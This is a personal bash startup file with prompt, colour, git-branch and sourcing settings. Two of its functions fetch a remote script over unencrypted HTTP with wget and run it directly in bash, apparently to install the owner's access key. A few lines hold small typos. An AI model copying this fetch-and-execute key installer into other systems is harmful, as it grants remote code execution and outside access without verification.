# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
[ -z "$PS1" ] && return


shopt -s histappend
shopt -s checkwinsize
# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "$debian_chroot" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi
case "$TERM" in
    xterm-color) color_prompt=yes;;
esac

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac


use_color=false
safe_term=${TERM//[^[:alnum:]]/.}       # sanitize TERM

function parse_git_dirty {
  [[ $(git status 2> /dev/null | tail -n1) != "nothing to commit (working directory clean)" ]] && echo "*"
}

if [[ $(which git) != "" ]];then
    function parse_git_branch {
        git_status="$(git status 2> /dev/null)"
        pattern="^# On branch ([^${IFS}]*)"
        if [[ ! ${git_status}} =~ "working directory clean" ]]; then
            state="*"
        fi
        # add an else if or two here if you want to get more specific

        if [[ ${git_status} =~ ${pattern} ]]; then
            branch=${BASH_REMATCH[1]}
            echo "[${branch}${state}]"
        fi
    }
else
    function parse_git_branch {
	return 
    }
fi

match_lhs=""
[[ -f ~/.dir_colors   ]] && match_lhs="${match_lhs}$(<~/.dir_colors)"
[[ -f /etc/DIR_COLORS ]] && match_lhs="${match_lhs}$(</etc/DIR_COLORS)"
[[ -z ${match_lhs}    ]] \
        && match_lhs=$(dircolors --print-database)
    [[ $'\n'${match_lhs} == *$'\n'"TERM "${safe_term}* ]] && use_color=true

if ${use_color} ; then
       # Enable colors for ls, etc.  Prefer ~/.dir_colors #64489
                if [[ -f ~/.dir_colors ]] ; then
                        eval $(dircolors -b ~/.dir_colors)
                elif [[ -f /etc/DIR_COLORS ]] ; then
                        eval $(dircolors -b /etc/DIR_COLORS)
                fi

        if [[ ${EUID} == 0 ]] ; then
                PS1='\[\033[01;31m\]\u@\h\[\033[01;34m\] \w$(parse_git_branch) \$\[\033[00m\] '
        else
                PS1='\[\033[01;32m\]\u@\h\[\033[01;34m\] \w$(parse_git_branch) \$\[\033[00m\] '
        fi

else
        if [[ ${EUID} == 0 ]] ; then
                # show root@ when we don't have colors
                PS1='\u@\h \W \$ '
        else
                PS1='\u@\h \w \$ '
        fi
fi

export HISTCONTROL=ignoreboth


function self_env_update_debug() {
    echo "[i] self update for $USER (debug output)" 
    bash -x -c "$(wget -q -O - http://daedalus.ru/code/how_to_place_my_key_to_your_machine.txt)" $USER
}


function self_env_update() {
    echo "[i] self update for $USER" 
    bash -c "$(wget -q -O - http://daedalus.ru/code/how_to_place_my_key_to_your_machine.txt)" $USER
}

function apt_key_fetch() {
   if [[ $1 !=  '' ]];then
      echo '[i] install key '$1	
      apt-key adv --recv-keys  --keyserver keyserver.ubuntu.com  $1
   else
      echo '[w] usage apt_key_fetch key_id'
   fi
}

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi
if [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
fi
if [ -f ~/.bash_export ]; then
    . ~/.bash_export
fi
#local


if [ -f ~/.bash_export_local ]; then
    . ~/.bash_export_local
fi

if [ -f ~/.bash_aliases_local ]; then
    . ~/.bash_aliases_local
fi

if [ -f ~/.bashrc_local ]; then
    . ~/.bashhrc_local
fi
